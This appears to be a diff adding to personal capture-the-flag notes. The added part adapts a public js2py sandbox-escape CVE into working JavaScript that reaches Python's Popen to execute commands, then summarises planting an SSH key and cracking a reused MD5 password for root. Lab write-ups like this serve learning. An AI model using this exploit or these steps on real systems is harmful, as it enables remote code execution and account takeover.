@@ -46,3 +46,29 @@ Login seems to work and returns a cookie
 
 Said cookie identifies the Server: gunicorn/20.0.4  there is a CVE for that version. That said there doesn't seem to be an admin page I can access with it. 
 https://security.snyk.io/vuln/SNYK-PYTHON-GUNICORN-9510910
+
+There is also a download button that gives out the source for the website, this indicates the site is using js2py==0.74 for the JS to Python conversion. A quite google finds CVE-2024-28397
+https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/analysis_en.md
+which seems to give RCE however the example given doesn't work out the box for me. Using the downloaded version of the site I was able to work backwards to get,
+
+```
+// Working RCE
+let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__
+let obj = a(a(a,"__class__"), "__base__")
+for (let i in obj.__subclasses__()){
+  if (obj.__subclasses__()[i].__name__ == "Popen"){
+    let sub = obj.__subclasses__()[i]
+    console.log(obj.__subclasses__()[i])
+  }
+}
+
+let cmd = "id"
+let proc = sub(cmd, -1, null, -1, -1, -1, null, null, true)
+let out = proc.communicate()[0].decode("utf-8")
+
+// return a plain string (JSON-safe)
+"" + out
+```
+
+Once I had RCE I was able to inject a SSH key into the user and login. I later found the user password had been reused as a password on the website, grabbing the MD5 digest and dumping it in hashes.com gave the password.
+Accessing the root flag was trivial 
